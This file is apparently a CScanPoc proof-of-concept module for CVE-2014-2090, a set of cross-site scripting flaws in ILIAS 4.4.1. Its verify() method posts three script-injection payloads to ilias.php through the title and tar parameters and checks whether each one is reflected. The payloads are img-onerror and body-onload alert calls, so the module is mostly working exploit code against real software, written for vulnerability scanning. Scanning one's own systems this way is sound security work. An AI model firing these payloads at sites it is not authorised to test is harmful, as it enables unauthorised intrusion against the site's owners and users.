# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ILIAS_0001_L'  # 平台漏洞编号，留空
    name = 'ILIAS ilias.php存在多个跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.LOW   # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-03-04'  # 漏洞公布时间
    desc = '''
        ILIAS是一款基于WEB的教学管理系统。

        ILIAS 4.4.1版本中的ilias.php存在跨站脚本漏洞，允许远程验证用户通过(1) tar(2) tar_val(3) title参数注入任意的web脚本或HTML。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-01434'  # 漏洞来源
    cnvd_id = 'CNVD-2014-01434'  # cnvd漏洞编号
    cve_id = 'CVE-2014-2090'  # cve编号
    product = 'ILIAS'  # 漏洞应用名称
    product_version = '4.4.1版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2568a35b-8a21-489d-bc1c-96a49f1d0531'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/k/cms/ilias/ilias.php?wsp_id=2&cmd=post&cmdClass=ilobjbloggui&cmdNode=mw:my:ma&baseClass=ilPersonalDesktopGUI&fallbackCmd=createPosting&rtoken=6bac7751a71721f25adb9e579dea4344'
            data = """title=$("%3cimg%2fsrc%3d'x'%2fonerror%3dalert(9999)%3e")&cmd%5BcreatePosting%5D=Add+Posting"""
            url = self.target + payload
            r = requests.post(url, data=data)

            if "<img/src='x'/onerror=alert(9999)>" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            payload = '/k/cms/ilias/ilias.php?ref_id=1&new_type=webr&cmd=post&cmdClass=ilobjlinkresourcegui&cmdNode=nm:9y&baseClass=ilRepositoryGUI&rtoken=6bac7751a71721f25adb9e579dea4344'
            data = """tar_mode=ext&tar='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&tar_val=%3Cdiv+id%3D%22tar_value
                    %22%3E%0D%0A%09%0D%0A%3C%2Fdiv%3E%09%0D%0A%3Cdiv+class%3D%22small%22%3E%0D%0A%09%3Ca+id%3D%
                    22tar_ajax%22+class%3D%22iosEditInternalLinkTrigger%22+href%3D%22ilias.php%3Fref_id%3D1%26n
                    ew_type%3Dwebr%26postvar%3Dtar%26cmdClass%3Dilinternallinkgui%26cmdNode%3Dnm%3A9y%3A3l%3A3z
                    %3A3s%3Ai1%26baseClass%3DilRepositoryGUI%26cmdMode%3Dasynch%22%3E%26raquo%3B+Select+Target+
                    Object%3C%2Fa%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cdiv+class%3D%22small++ilNoDisplay%22+id%3D%22tar
                    _rem%22%3E%0D%0A%09%3Ca+class%3D%22ilLinkInputRemove%22+href%3D%22%23%22%3E%26raquo%3B+Remo
                    ve%3C%2Fa%3E%0D%0A%3C%2Fdiv%3E&tar_ajax_type=&tar_ajax_id=&tar_ajax_target=&tit=asdasd&des=
                    asdasd&cmd%5Bsave%5D=Add+Weblink"""
            url = self.target + payload
            r = requests.post(url, data=data)

            if "<body/onload=alert(9999)>" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            payload = '/k/cms/ilias/ilias.php?wsp_id=111&bmn=2014-02&cmd=post&cmdClass=ilobjbloggui&cmdNode=mw:my:ma&baseClass=ilPersonalDesktopGUI&fallbackCmd=createPosting&rtoken=1561f316d721f9683b0ae5f0b652db25'
            data = """title=%27%3E%22%3E%3Cbody%2Fonload%3Dalert%28123%29%3E&cmd%5BcreatePosting%5D=Add+Posting"""
            url = self.target + payload
            r = requests.post(url, data=data)

            if "<body/onload=alert(123)>" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
